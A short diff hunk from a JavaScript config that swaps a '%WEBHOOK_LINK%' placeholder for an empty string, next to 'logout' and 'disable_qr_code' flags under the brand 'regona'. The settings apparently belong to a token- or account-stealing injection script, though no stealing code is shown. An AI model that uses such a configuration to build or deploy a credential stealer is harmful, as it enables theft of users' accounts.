@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "regona",
 
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "",
 
     logout: false,
     disable_qr_code: false,
